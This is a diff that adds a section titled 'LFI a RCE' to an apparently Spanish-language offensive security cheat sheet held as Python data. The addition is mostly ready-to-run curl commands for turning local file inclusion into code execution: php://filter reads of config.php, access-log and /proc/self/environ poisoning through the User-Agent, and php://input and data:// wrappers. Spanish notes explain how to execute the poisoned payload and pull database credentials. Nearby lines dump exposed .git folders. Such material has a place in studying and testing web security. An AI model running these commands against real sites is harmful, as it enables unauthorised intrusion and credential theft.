@@ -468,6 +468,21 @@ SECTIONS = [
                 "git-dumper $URL/.git/ ./loot_git",
                 "curl -sS \"$URL/.git/HEAD\"",
             ]),
+            ("h2", "LFI a RCE"),
+            ("code", [
+                "curl -sS \"$URL/page.php?file=php://filter/convert.base64-encode/resource=config.php\"",
+                "curl -sS \"$URL/page.php?file=/var/log/apache2/access.log\"",
+                "curl -sS \"$URL/\" -A 'PAYLOAD_PHP'; curl -sS \"$URL/page.php?file=/var/log/apache2/access.log&c=id\"",
+                "curl -sS --data 'PAYLOAD_PHP' \"$URL/page.php?file=php://input&c=id\"",
+                "curl -sS \"$URL/page.php?file=data://text/plain;base64,BASE64_PHP&c=id\"",
+                "curl -sS \"$URL/page.php?file=/proc/self/environ\" -A 'PAYLOAD_PHP'",
+                "python3 php_filter_chain_generator.py --chain 'PAYLOAD_PHP'",
+            ]),
+            ("bullets", [
+                "LFI a RCE: si puedes incluir un fichero, busca uno que TU controles (logs con tu User-Agent, /proc/self/environ, php://input o data://).",
+                "PAYLOAD_PHP es tu codigo PHP minimo (un system del parametro c); envenenas el log/entrada y luego lo incluyes con ?file= para que se ejecute.",
+                "Si solo puedes leer, php://filter saca el codigo fuente en base64: ahi suelen estar las credenciales de BD.",
+            ]),
             ("h2", "Triage de bugs"),
             ("table", [
                 ["Bug", "Senales y prueba inicial"],
